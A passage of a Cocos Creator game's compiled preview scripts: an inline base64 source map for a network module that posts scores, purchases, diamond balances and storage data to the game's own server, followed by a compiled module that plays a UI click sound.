NyZWF0b3IvbWFudWFsL3poL3NjcmlwdGluZy90eXBlc2NyaXB0Lmh0bWxcclxuLy8gIC0gW0VuZ2xpc2hdIGh0dHA6Ly93d3cuY29jb3MyZC14Lm9yZy9kb2NzL2NyZWF0b3IvbWFudWFsL2VuL3NjcmlwdGluZy90eXBlc2NyaXB0Lmh0bWxcclxuLy8gTGVhcm4gQXR0cmlidXRlOlxyXG4vLyAgLSBbQ2hpbmVzZV0gaHR0cDovL2RvY3MuY29jb3MuY29tL2NyZWF0b3IvbWFudWFsL3poL3NjcmlwdGluZy9yZWZlcmVuY2UvYXR0cmlidXRlcy5odG1sXHJcbi8vICAtIFtFbmdsaXNoXSBodHRwOi8vd3d3LmNvY29zMmQteC5vcmcvZG9jcy9jcmVhdG9yL21hbnVhbC9lbi9zY3JpcHRpbmcvcmVmZXJlbmNlL2F0dHJpYnV0ZXMuaHRtbFxyXG4vLyBMZWFybiBsaWZlLWN5Y2xlIGNhbGxiYWNrczpcclxuLy8gIC0gW0NoaW5lc2VdIGh0dHA6Ly9kb2NzLmNvY29zLmNvbS9jcmVhdG9yL21hbnVhbC96aC9zY3JpcHRpbmcvbGlmZS1jeWNsZS1jYWxsYmFja3MuaHRtbFxyXG4vLyAgLSBbRW5nbGlzaF0gaHR0cDovL3d3dy5jb2NvczJkLXgub3JnL2RvY3MvY3JlYXRvci9tYW51YWwvZW4vc2NyaXB0aW5nL2xpZmUtY3ljbGUtY2FsbGJhY2tzLmh0bWxcclxuXHJcblxyXG5pbXBvcnQge1dvcmxkfSBmcm9tIFwiLi4vaW5mby9Xb3JsZFwiO1xyXG5pbXBvcnQge0FwcENvbmZpZ30gZnJvbSBcIi4uL2NvbmZpZy9BcHBDb25maWdcIjtcclxuaW1wb3J0IEh0dHBQcm90b2NvbCBmcm9tIFwiLi4vLi4vLi4vZnJhbWV3b3JrL2h0dHAvSHR0cFByb3RvY29sXCI7XHJcbmltcG9ydCB7SHR0cENsaWVudH0gZnJvbSBcIi4uLy4uLy4uL2ZyYW1ld29yay9odHRwL0h0dHBDbGllbnRcIjtcclxuaW1wb3J0IHtIdHRwT3B0aW9ufSBmcm9tIFwiLi4vLi4vLi4vZnJhbWV3b3JrL2h0dHAvSHR0cE9wdGlvblwiO1xyXG5pbXBvcnQge0xvY2FsU3RvcmFnZX0gZnJvbSBcIi4uLy4uLy4uL2ZyYW1ld29yay9wZXJzaXN0ZW5jZS9Mb2NhbFN0b3JhZ2VcIjtcclxuaW1wb3J0IEZhY2FkZSBmcm9tIFwiLi4vLi4vLi4vZnJhbWV3b3JrL2ZhY2FkZS9GYWNhZGVcIjtcclxuaW1wb3J0IHtOZXR3b3JrQ29uZmlnfSBmcm9tIFwiLi4vY29uZmlnL05ldHdvcmtDb25maWdcIjtcclxuXHJcbmV4cG9ydCBkZWZhdWx0IGNsYXNzIE5ldHdvcmsge1xyXG5cclxuICAgIHN0YXRpYyBhc3luYyBwb3N0KHByb3RvY29sOkh0dHBQcm90b2NvbCwgaHR0cE9wdGlvbj86SHR0cE9wdGlvbik6UHJvbWlzZTxhbnk+e1xyXG4gICAgICAgIC8vIFNFTEZcclxuICAgICAgICByZXR1cm5cclxuXHJcbiAgICAgICAgcmV0dXJuIG5ldyBQcm9taXNlKGFzeW5jKHJlc29sdmUsIHJlamVjdCkgPT4ge1xyXG4gICAgICAgICAgICB0cnkge1xyXG4gICAgICAgICAgICAgICAgbGV0IGRhdGEgPSBhd2FpdCBIdHRwQ2xpZW50LnBvc3QocHJvdG9jb2wpO1xyXG4gICAgICAgICAgICAgICAgcmVzb2x2ZShkYXRhKTtcclxuICAgICAgICAgICAgfWNhdGNoIChlKSB7XHJcbiAgICAgICAgICAgICAgICBjb25zb2xlLmxvZyhlLCBcIue9kee7nOWHuumUmeS6huKApuKApuKApuKAplwiKTtcclxuICAgICAgICAgICAgICAgIGlmIChlLnN0YXR1cyA9PSAwKXtcclxuICAgICAgICAgICAgICAgICAgICBGYWNhZGUuZXhlY3V0ZUNvbW1hbmQoJ1Nob3dUaXBzQ29tbWFuZCcsIGAke2UubWVzc2FnZX066K+35qOA5p+l572R57uc6L+e5o6lYCk7XHJcbiAgICAgICAgICAgICAgICB9ZWxzZSBpZiAoZS5zdGF0dXMgPT0gMSl7XHJcbiAgICAgICAgICAgICAgICAgICAgRmFjYWRlLmV4ZWN1dGVDb21tYW5kKCdTaG93VGlwc0NvbW1hbmQnLCBgJHtlLm1lc3NhZ2V9OnVyaT0ke2UucHJvdG9jb2wudXJpfWApO1xyXG4gICAgICAgICAgICAgICAgfSBlbHNlIGlmIChlLnN0YXR1cyA9PSAyMDApIHtcclxuICAgICAgICAgICAgICAgICAgICBpZiAoZS5wcm90b2NvbC5nZXRSZXNwb25zZVN0YXR1cygpID09IC0yKXtcclxuICAgICAgICAgICAgICAgICAgICAgICAgLyoqIG5vdCBsb2dpbiovXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IE5ldHdvcmsubG9naW4oKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgbGV0IGRhdGEgPSBhd2FpdCBOZXR3b3JrLnBvc3QoZS5wcm90b2NvbCwgaHR0cE9wdGlvbik7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHJlc29sdmUoZGF0YSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybjtcclxuICAgICAgICAgICAgICAgICAgICB9ZWxzZSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIEZhY2FkZS5leGVjdXRlQ29tbWFuZCgnU2hvd1RpcHNDb21tYW5kJywgYCR7ZS5tZXNzYWdlfTp1cmk9JHtlLnByb3RvY29sLnVyaX0gc3RhdHVzPSR7ZS5wcm90b2NvbC5nZXRSZXNwb25zZVN0YXR1cygpfWApO1xyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIH1lbHNlIHtcclxuICAgICAgICAgICAgICAgICAgICBGYWNhZGUuZXhlY3V0ZUNvbW1hbmQoJ1Nob3dUaXBzQ29tbWFuZCcsIGAke2UubWVzc2FnZX06dXJpPSR7ZS5wcm90b2NvbC51cml9IHN0YXR1cz0ke2Uuc3RhdHVzfWApO1xyXG4gICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgcmVqZWN0KGUpO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgfSk7XHJcbiAgICB9XHJcblxyXG4gICAgc3RhdGljIGFzeW5jIGxvZ2luKCk6UHJvbWlzZXtcclxuICAgICAgICByZXR1cm4gbmV3IFByb21pc2UoYXN5bmMgcmVzb2x2ZSA9PiB7XHJcbiAgICAgICAgICAgIHJlc29sdmUoKTtcclxuICAgICAgICB9KTtcclxuICAgIH1cclxuXHJcbiAgICBzdGF0aWMgYXN5bmMgdXBsb2FkSW5mbygpOlByb21pc2V7XHJcbiAgICAgICAgcmV0dXJuIG5ldyBQcm9taXNlKGFzeW5jIChyZXNvbHZlLCByZWplY3QpID0+IHtcclxuICAgICAgICAgICAgcmVzb2x2ZSgpO1xyXG4gICAgICAgIH0pO1xyXG4gICAgfVxyXG5cclxuICAgIHN0YXRpYyBhc3luYyBpbml0RGF0YSgpe1xyXG4gICAgICAgIGlmIChOZXR3b3JrQ29uZmlnLmNvbm5lY3RTZXJ2ZXIpe1xyXG4gICAgICAgICAgICBhd2FpdCBOZXR3b3JrLmluaXRHYW1lRGF0YSgpO1xyXG4gICAgICAgIH1lbHNlIHtcclxuICAgICAgICAgICAgV29ybGQuU3RvcmFnZS5pbml0KCk7XHJcbiAgICAgICAgfVxyXG4gICAgfVxyXG5cclxuICAgIHN0YXRpYyBhc3luYyB1cGxvYWRMdihsdjpudW1iZXIpOlByb21pc2U8YW55PntcclxuICAgICAgICByZXR1cm4gbmV3IFByb21pc2UoYXN5bmMgKHJlc29sdmUsIHJlamVjdCkgPT4ge1xyXG4gICAgICAgICAgICBsZXQgcHJvdG9jb2wgPSBuZXcgSHR0cFByb3RvY29sKCk7XHJcbiAgICAgICAgICAgIHByb3RvY29sLnVyaSA9IFwiL2dhbWUvYWRkUmVjb3JkXCI7XHJcbiAgICAgICAgICAgIHByb3RvY29sLnJlcXVlc3QgPSB7Z2FtZUlkOkFwcENvbmZpZy5HYW1lSUQsIGtleTpBcHBDb25maWcucmFua0tleSwgc2NvcmU6bHZ9O1xyXG4gICAgICAgICAgICBhd2FpdCBOZXR3b3JrLnBvc3QocHJvdG9jb2wpO1xyXG4gICAgICAgICAgICB0aGlzLnB1c2hTdG9yYWdlKCk7XHJcbiAgICAgICAgICAgIHJlc29sdmUoKTtcclxuICAgICAgICB9KTtcclxuICAgIH1cclxuXHJcblxyXG4gICAgc3RhdGljIGFzeW5jIGJ1eUl0ZW0oaXRlbUlkOm51bWJlciwgbnVtOm51bWJlciA9IDEpOlByb21pc2U8YW55PntcclxuICAgICAgICByZXR1cm4gbmV3IFByb21pc2UoYXN5bmMocmVzb2x2ZSwgcmVqZWN0KSA9PiB7XHJcbiAgICAgICAgICAgIGxldCBwcm90b2NvbCA9IG5ldyBIdHRwUHJvdG9jb2woKTtcclxuICAgICAgICAgICAgcHJvdG9jb2wudXJpID0gXCIvZ2FtZS9tYWxsL2J1eVwiO1xyXG4gICAgICAgICAgICBwcm90b2NvbC5yZXF1ZXN0ID0ge2lkOml0ZW1JZCwgbnVtOm51bX07XHJcbiAgICAgICAgICAgIGF3YWl0IE5ldHdvcmsucG9zdChwcm90b2NvbCk7XHJcbiAgICAgICAgICAgIHJlc29sdmUoKTtcclxuICAgICAgICB9KTtcclxuICAgIH1cclxuXHJcbiAgICBzdGF0aWMgYXN5bmMgc3luY0JvdWdodCgpOlByb21pc2U8QXJyYXk8YW55Pj57XHJcbiAgICAgICAgcmV0dXJuIG5ldyBQcm9taXNlPEFycmF5PGFueT4+KGFzeW5jKHJlc29sdmUsIHJlamVjdCkgPT4ge1xyXG4gICAgICAgICAgICBsZXQgcHJvdG9jb2wgPSBuZXcgSHR0cFByb3RvY29sKCk7XHJcbiAgICAgICAgICAgIHByb3RvY29sLnVyaSA9IFwiL2dhbWUvdXNlci9pdGVtc1wiO1xyXG4gICAgICAgICAgICBsZXQgbGlzdCA9IDxBcnJheTxhbnk+PmF3YWl0IE5ldHdvcmsucG9zdChwcm90b2NvbCk7XHJcbiAgICAgICAgICAgIHJlc29sdmUobGlzdCk7XHJcbiAgICAgICAgfSk7XHJcbiAgICB9XHJcblxyXG4gICAgc3RhdGljIGFzeW5jIHRvdGFsUmFua0xpc3QoKTpQcm9taXNlPEFycmF5PGFueT4+e1xyXG4gICAgICAgIHJldHVybiBuZXcgUHJvbWlzZTxBcnJheTxhbnk+Pihhc3luYyAocmVzb2x2ZSwgcmVqZWN0KSA9PiB7XHJcbiAgICAgICAgICAgIGxldCBwcm90b2NvbCA9IG5ldyBIdHRwUHJvdG9jb2woKTtcclxuICAgICAgICAgICAgcHJvdG9jb2wudXJpID0gXCIvZ2FtZS9nZXRUb3RhbFJhbmtcIjtcclxuICAgICAgICAgICAgcHJvdG9jb2wucmVxdWVzdCA9IHtnYW1lSWQ6IEFwcENvbmZpZy5HYW1lSUQsIGtleTpBcHBDb25maWcucmFua0tleX07XHJcbiAgICAgICAgICAgIHRyeSB7XHJcbiAgICAgICAgICAgICAgICBsZXQge2xpc3R9ID0gYXdhaXQgTmV0d29yay5wb3N0KHByb3RvY29sKTtcclxuICAgICAgICAgICAgICAgIHJlc29sdmUobGlzdCk7XHJcbiAgICAgICAgICAgIH1jYXRjaCAoZSkge1xyXG4gICAgICAgICAgICAgICAgcmVqZWN0KGUpO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgfSk7XHJcbiAgICB9XHJcblxyXG5cclxuICAgIHN0YXRpYyBhc3luYyBhZGREaWFtb25kKGFkZDpudW1iZXIpOlByb21pc2U8bnVtYmVyPntcclxuICAgICAgICByZXR1cm4gbmV3IFByb21pc2U8bnVtYmVyPihhc3luYyAocmVzb2x2ZSwgcmVqZWN0KSA9PiB7XHJcbiAgICAgICAgICAgIGxldCBwcm90b2NvbCA9IG5ldyBIdHRwUHJvdG9jb2woKTtcclxuICAgICAgICAgICAgcHJvdG9jb2wudXJpID0gXCIvZ2FtZS91c2VyL2FkZERpYW1vbmRcIjtcclxuICAgICAgICAgICAgcHJvdG9jb2wucmVxdWVzdCA9IHtudW06YWRkfTtcclxuICAgICAgICAgICAgbGV0IHtkaWFtb25kfSA9IGF3YWl0IE5ldHdvcmsucG9zdChwcm90b2NvbCk7XHJcbiAgICAgICAgICAgIHJlc29sdmUoZGlhbW9uZCk7XHJcbiAgICAgICAgfSk7XHJcbiAgICB9XHJcblxyXG4gICAgc3RhdGljIGFzeW5jIGV4cGVuZERpYW1vbmQoZXhwZW5kOm51bWJlcik6UHJvbWlzZTxudW1iZXI+e1xyXG4gICAgICAgIHJldHVybiBuZXcgUHJvbWlzZTxudW1iZXI+KGFzeW5jIChyZXNvbHZlLCByZWplY3QpID0+IHtcclxuICAgICAgICAgICAgbGV0IHByb3RvY29sID0gbmV3IEh0dHBQcm90b2NvbCgpO1xyXG4gICAgICAgICAgICBwcm90b2NvbC51cmkgPSBcIi9nYW1lL3VzZXIvZXhwZW5kRGlhbW9uZFwiO1xyXG4gICAgICAgICAgICBwcm90b2NvbC5yZXF1ZXN0ID0ge251bTpleHBlbmR9O1xyXG4gICAgICAgICAgICBsZXQge2RpYW1vbmR9ID0gYXdhaXQgTmV0d29yay5wb3N0KHByb3RvY29sKTtcclxuICAgICAgICAgICAgcmVzb2x2ZShkaWFtb25kKTtcclxuICAgICAgICB9KTtcclxuICAgIH1cclxuXHJcbiAgICBzdGF0aWMgYXN5bmMgb25TaGFyZShzaGFyZUtleTogc3RyaW5nLCBwbGF5ZXJJZDogbnVtYmVyKTogUHJvbWlzZSB7XHJcbiAgICAgICAgcmV0dXJuIG5ldyBQcm9taXNlKGFzeW5jIChyZXNvbHZlLCByZWplY3QpID0+IHtcclxuICAgICAgICAgICAgaWYgKFdvcmxkLk15LnBsYXllcklkICE9IDApe1xyXG4gICAgICAgICAgICAgICAgbGV0IHByb3RvY29sID0gbmV3IEh0dHBQcm90b2NvbCgpO1xyXG4gICAgICAgICAgICAgICAgcHJvdG9jb2wudXJpID0gXCIvZ2FtZS9vblNoYXJlXCI7XHJcbiAgICAgICAgICAgICAgICBwcm90b2NvbC5yZXF1ZXN0ID0ge3NoYXJlS2V5OiBzaGFyZUtleSwgZnJvbVBsYXllcklkOiBwbGF5ZXJJZH07XHJcbiAgICAgICAgICAgICAgICBhd2FpdCBOZXR3b3JrLnBvc3QocHJvdG9jb2wpO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIHJlc29sdmUoKTtcclxuICAgICAgICB9KTtcclxuICAgIH1cclxuXHJcbiAgICBzdGF0aWMgYXN5bmMgZ2V0U2hhcmVMaXN0KHNoYXJlS2V5OiBzdHJpbmcpOiBQcm9taXNlPEFycmF5PiB7XHJcbiAgICAgICAgcmV0dXJuIG5ldyBQcm9taXNlPEFycmF5Pihhc3luYyAocmVzb2x2ZSwgcmVqZWN0KSA9PiB7XHJcbiAgICAgICAgICAgIGxldCBwcm90b2NvbCA9IG5ldyBIdHRwUHJvdG9jb2woKTtcclxuICAgICAgICAgICAgcHJvdG9jb2wudXJpID0gXCIvZ2FtZS9nZXRTaGFyZUxpc3RcIjtcclxuICAgICAgICAgICAgcHJvdG9jb2wucmVxdWVzdCA9IHtzaGFyZUtleTogc2hhcmVLZXl9O1xyXG4gICAgICAgICAgICBsZXQgbGlzdCA9IGF3YWl0IE5ldHdvcmsucG9zdChwcm90b2NvbCk7XHJcbiAgICAgICAgICAgIHJlc29sdmUobGlzdCk7XHJcbiAgICAgICAgfSk7XHJcbiAgICB9XHJcblxyXG4gICAgc3RhdGljIGFzeW5jIHRha2VTaGFyZVJld2FyZChzaGFyZUtleTogc3RyaW5nLCBwbGF5ZXJJZDogbnVtYmVyKTogUHJvbWlzZSB7XHJcbiAgICAgICAgcmV0dXJuIG5ldyBQcm9taXNlKGFzeW5jIChyZXNvbHZlLCByZWplY3QpID0+IHtcclxuICAgICAgICAgICAgbGV0IHByb3RvY29sID0gbmV3IEh0dHBQcm90b2NvbCgpO1xyXG4gICAgICAgICAgICBwcm90b2NvbC51cmkgPSBcIi9nYW1lL3JlY2VpdmVTaGFyZWRSZWNvcmRcIjtcclxuICAgICAgICAgICAgcHJvdG9jb2wucmVxdWVzdCA9IHtzaGFyZUtleTogc2hhcmVLZXksIHJlY2VpdmVQbGF5ZXJJZDogcGxheWVySWR9O1xyXG4gICAgICAgICAgICBhd2FpdCBOZXR3b3JrLnBvc3QocHJvdG9jb2wpO1xyXG4gICAgICAgICAgICByZXNvbHZlKCk7XHJcbiAgICAgICAgfSk7XHJcbiAgICB9XHJcblxyXG4gICAgcHJpdmF0ZSBzdGF0aWMgYXN5bmMgc2V0U3RvcmFnZShrZXk6c3RyaW5nLCB2YWx1ZTpzdHJpbmcpOlByb21pc2U8Ym9vbGVhbj57XHJcbiAgICAgICAgcmV0dXJuIG5ldyBQcm9taXNlPGJvb2xlYW4+KGFzeW5jIChyZXNvbHZlLCByZWplY3QpID0+IHtcclxuICAgICAgICAgICAgbGV0IHByb3RvY29sID0gbmV3IEh0dHBQcm90b2NvbCgpO1xyXG4gICAgICAgICAgICBwcm90b2NvbC51cmkgPSBcIi9nYW1lL3NldFN0b3JhZ2VcIjtcclxuICAgICAgICAgICAgcHJvdG9jb2wucmVxdWVzdCA9IHtrZXk6a2V5LCB2YWx1ZTp2YWx1ZX07XHJcbiAgICAgICAgICAgIGF3YWl0IE5ldHdvcmsucG9zdChwcm90b2NvbCk7XHJcbiAgICAgICAgICAgIHJlc29sdmUodHJ1ZSk7XHJcbiAgICAgICAgfSk7XHJcbiAgICB9XHJcblxyXG4gICAgcHJpdmF0ZSBzdGF0aWMgYXN5bmMgbXVsdGlTZXRTdG9yYWdlKHBhaXJzOktWRGF0YTxzdHJpbmc+KTpQcm9taXNlPGJvb2xlYW4+e1xyXG4gICAgICAgIHJldHVybiBuZXcgUHJvbWlzZTxib29sZWFuPihhc3luYyAocmVzb2x2ZSwgcmVqZWN0KSA9PiB7XHJcbiAgICAgICAgICAgIGxldCBwcm90b2NvbCA9IG5ldyBIdHRwUHJvdG9jb2woKTtcclxuICAgICAgICAgICAgcHJvdG9jb2wudXJpID0gXCIvZ2FtZS9tdWx0aVNldFN0b3JhZ2VcIjtcclxuICAgICAgICAgICAgcHJvdG9jb2wucmVxdWVzdCA9IHtwYWlyczpKU09OLnN0cmluZ2lmeShwYWlycyl9O1xyXG4gICAgICAgICAgICBhd2FpdCBOZXR3b3JrLnBvc3QocHJvdG9jb2wpO1xyXG4gICAgICAgICAgICByZXNvbHZlKHRydWUpO1xyXG4gICAgICAgIH0pO1xyXG4gICAgfVxyXG5cclxuICAgIHByaXZhdGUgc3RhdGljIGFzeW5jIGdldFN0b3JhZ2Uoa2V5OnN0cmluZyk6UHJvbWlzZTxzdHJpbmc+e1xyXG4gICAgICAgIHJldHVybiBuZXcgUHJvbWlzZTxzdHJpbmc+KGFzeW5jIChyZXNvbHZlLCByZWplY3QpID0+IHtcclxuICAgICAgICAgICAgbGV0IHByb3RvY29sID0gbmV3IEh0dHBQcm90b2NvbCgpO1xyXG4gICAgICAgICAgICBwcm90b2NvbC51cmkgPSBcIi9nYW1lL2dldFN0b3JhZ2VcIjtcclxuICAgICAgICAgICAgcHJvdG9jb2wucmVxdWVzdCA9IHtrZXk6a2V5fTtcclxuICAgICAgICAgICAgbGV0IGRhdGEgPSBhd2FpdCBOZXR3b3JrLnBvc3QocHJvdG9jb2wpO1xyXG4gICAgICAgICAgICByZXNvbHZlKGRhdGEpO1xyXG4gICAgICAgIH0pO1xyXG4gICAgfVxyXG5cclxuICAgIHByaXZhdGUgc3RhdGljIGFzeW5jIG11bHRpR2V0U3RvcmFnZShrZXlzOkFycmF5PHN0cmluZz4pOlByb21pc2U8S1ZEYXRhPHN0cmluZz4+e1xyXG4gICAgICAgIHJldHVybiBuZXcgUHJvbWlzZTxLVkRhdGE8c3RyaW5nPj4oYXN5bmMgKHJlc29sdmUsIHJlamVjdCkgPT4ge1xyXG4gICAgICAgICAgICBsZXQgcHJvdG9jb2wgPSBuZXcgSHR0cFByb3RvY29sKCk7XHJcbiAgICAgICAgICAgIHByb3RvY29sLnVyaSA9IFwiL2dhbWUvbXVsdGlHZXRTdG9yYWdlXCI7XHJcbiAgICAgICAgICAgIHByb3RvY29sLnJlcXVlc3QgPSB7a2V5czpKU09OLnN0cmluZ2lmeShrZXlzKX07XHJcbiAgICAgICAgICAgIGxldCBkYXRhID0gYXdhaXQgTmV0d29yay5wb3N0KHByb3RvY29sKTtcclxuICAgICAgICAgICAgcmVzb2x2ZShkYXRhKTtcclxuICAgICAgICB9KTtcclxuICAgIH1cclxuXHJcblxyXG4gICAgcHVibGljIHN0YXRpYyBhc3luYyBpbml0R2FtZURhdGEoKTpQcm9taXNle1xyXG4gICAgICAgIHJldHVybiBuZXcgUHJvbWlzZShhc3luYyAocmVzb2x2ZSwgcmVqZWN0KSA9PiB7XHJcbiAgICAgICAgICAgIC8qKiDku6XmnI3liqHlmajkuLrkuLss6Zmk5LqGdXBkYXRlU3RvcmFnZUtleXPph4zpnaLmsqHmm7TmlrDnmoTmlbDmja7ku6XlrqLmiLfnq6/kuLrkuLsgKiovXHJcbiAgICAgICAgICAgIGxldCBrZXlzID0gV29ybGQuU3RvcmFnZS5hbGxLZXlzKCkuZmlsdGVyKHZhbHVlID0+ICFXb3JsZC51cGRhdGVTdG9yYWdlS2V5cy5pbmNsdWRlcyh2YWx1ZSkpO1xyXG4gICAgICAgICAgICBsZXQgdmFsdWVzID0gYXdhaXQgTmV0d29yay5tdWx0aUdldFN0b3JhZ2Uoa2V5cyk7XHJcbiAgICAgICAgICAgIGZvciAobGV0IGtleSBpbiB2YWx1ZXMpe1xyXG4gICAgICAgICAgICAgICAgbGV0IGRhdGEgPSB2YWx1ZXNba2V5XTtcclxuICAgICAgICAgICAgICAgIC8qKiDlrZfnrKbkuLLnsbvlnovliJnkuI3ovazmiJBpbnQgKi9cclxuICAgICAgICAgICAgICAgIGlmICh0eXBlb2YgV29ybGQuU3RvcmFnZVtcIl9cIitrZXldID09IFwibnVtYmVyXCIpe1xyXG4gICAgICAgICAgICAgICAgICAgIGRhdGEgPSBwYXJzZUludChkYXRhKTtcclxuICAgICAgICAgICAgICAgIH1lbHNlIGlmICh0eXBlb2YgV29ybGQuU3RvcmFnZVtcIl9cIitrZXldID09IFwiYm9vbGVhblwiKXtcclxuICAgICAgICAgICAgICAgICAgICBkYXRhID0gZGF0YS50b0xvd2VyQ2FzZSgpID09IFwidHJ1ZVwiO1xyXG4gICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgV29ybGQuU3RvcmFnZVtrZXldID0gZGF0YTtcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICByZXNvbHZlKCk7XHJcbiAgICAgICAgfSk7XHJcbiAgICB9XHJcblxyXG4gICAgLyoqIOaOqOmAgee8k+WtmOmHjOeahOaVsOaNruWIsOi/nOeoi+acjeWKoeWZqCAqL1xyXG4gICAgcHVibGljIHN0YXRpYyBhc3luYyBwdXNoU3RvcmFnZSgpe1xyXG4gICAgICAgIC8vIFNFTEZcclxuICAgICAgICByZXR1cm5cclxuXHJcbiAgICAgICAgcmV0dXJuIG5ldyBQcm9taXNlKGFzeW5jIChyZXNvbHZlLCByZWplY3QpID0+IHtcclxuICAgICAgICAgICAgY29uc29sZS5sb2coXCI9PT09PT09PT5wdXNoU3RvcmFnZVwiLCBXb3JsZC51cGRhdGVTdG9yYWdlS2V5cyk7XHJcbiAgICAgICAgICAgIGlmIChXb3JsZC51cGRhdGVTdG9yYWdlS2V5cy5sZW5ndGggPT0gMCl7XHJcbiAgICAgICAgICAgICAgICByZXNvbHZlKCk7XHJcbiAgICAgICAgICAgIH0gZWxzZSB7XHJcbiAgICAgICAgICAgICAgICBsZXQga3ZEYXRhcyA9IHt9O1xyXG4gICAgICAgICAgICAgICAgV29ybGQucHVzaFN0b3JhZ2VLZXlzID0gV29ybGQudXBkYXRlU3RvcmFnZUtleXM7XHJcbiAgICAgICAgICAgICAgICBXb3JsZC51cGRhdGVTdG9yYWdlS2V5cyA9IFtdO1xyXG4gICAgICAgICAgICAgICAgV29ybGQucHVzaFN0b3JhZ2VLZXlzLmZvckVhY2godmFsdWUgPT4ge1xyXG4gICAgICAgICAgICAgICAgICAgIGt2RGF0YXNbdmFsdWVdID0gV29ybGQuU3RvcmFnZVt2YWx1ZV07XHJcbiAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgIGF3YWl0IE5ldHdvcmsubXVsdGlTZXRTdG9yYWdlKGt2RGF0YXMpO1xyXG4gICAgICAgICAgICAgICAgV29ybGQucHVzaFN0b3JhZ2VLZXlzID0gW107XHJcbiAgICAgICAgICAgICAgICBMb2NhbFN0b3JhZ2Uuc2V0U3RyaW5nKFwidXBkYXRlS1ZEYXRhXCIsIEpTT04uc3RyaW5naWZ5KFdvcmxkLnVwZGF0ZVN0b3JhZ2VLZXlzKSk7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9KTtcclxuICAgIH1cclxufVxyXG4iXX0=
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/music/ClickSoundCommand.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '73a871wf5hCII8ZLCwWjPZx', 'ClickSoundCommand');
// script/app/music/ClickSoundCommand.ts

// Learn TypeScript:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/typescript.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/typescript.html
// Learn Attribute:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/reference/attributes.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/reference/attributes.html
// Learn life-cycle callbacks:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/life-cycle-callbacks.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/life-cycle-callbacks.html
Object.defineProperty(exports, "__esModule", { value: true });
var MusicPaths_1 = require("../config/MusicPaths");
var Music_1 = require("../../../framework/audio/Music");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var ClickSoundCommand = /** @class */ (function () {
    function ClickSoundCommand() {
    }
    ClickSoundCommand.prototype.execute = function () {
        var args = [];
        for (var _i = 0; _i < arguments.length; _i++) {
            args[_i] = arguments[_i];
        }
        return __awaiter(this, void 0, Promise, function () {
            var event, data;
            return __generator(this, function (_a) {
                event = args[0];
                data = args[1];
                /** 这里可以做一些过滤或特殊处理 */
                Music_1.Music.playSFX(MusicPaths_1.MusicPaths.ClickUI);
                return [2 /*return*/];
            });
        });
    };
    ClickSoundCommand = __decorate([
        ccclass("ClickSoundCommand")
    ], ClickSoundCommand);
    return ClickSoundCommand;
}());
exports.default = ClickSoundCommand;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL211c2ljL0NsaWNrU291bmRDb21tYW5kLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7OztBQUFBLG9CQUFvQjtBQUNwQixpRkFBaUY7QUFDakYseUZBQXlGO0FBQ3pGLG1CQUFtQjtBQUNuQiwyRkFBMkY7QUFDM0YsbUdBQW1HO0FBQ25HLDhCQUE4QjtBQUM5QiwyRkFBMkY7QUFDM0YsbUdBQW1HOztBQUtuRyxtREFBZ0Q7QUFDaEQsd0RBQXFEO0FBRS9DLElBQUEsS0FBc0IsRUFBRSxDQUFDLFVBQVUsRUFBbEMsT0FBTyxhQUFBLEVBQUUsUUFBUSxjQUFpQixDQUFDO0FBRzFDO0lBQUE7SUFRQSxDQUFDO0lBTlMsbUNBQU8sR0FBYjtRQUFlLGNBQU87YUFBUCxVQUFPLEVBQVAscUJBQU8sRUFBUCxJQUFPO1lBQVAseUJBQU87O3VDQUFFLE9BQU87OztnQkFDdkIsS0FBSyxHQUFHLElBQUksQ0FBQyxDQUFDLENBQUMsQ0FBQztnQkFDaEIsSUFBSSxHQUFHLElBQUksQ0FBQyxDQUFDLENBQUMsQ0FBQztnQkFDbkIscUJBQXFCO2dCQUNyQixhQUFLLENBQUMsT0FBTyxDQUFDLHVCQUFVLENBQUMsT0FBTyxDQUFDLENBQUM7Ozs7S0FDckM7SUFQZ0IsaUJBQWlCO1FBRHJDLE9BQU8sQ0FBQyxtQkFBbUIsQ0FBQztPQUNSLGlCQUFpQixDQVFyQztJQUFELHdCQUFDO0NBUkQsQUFRQyxJQUFBO2tCQVJvQixpQkFBaUIiLCJmaWxlIjoiIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyIvLyBMZWFybiBUeXBlU2NyaXB0OlxyXG4vLyAgLSBbQ2hpbmVz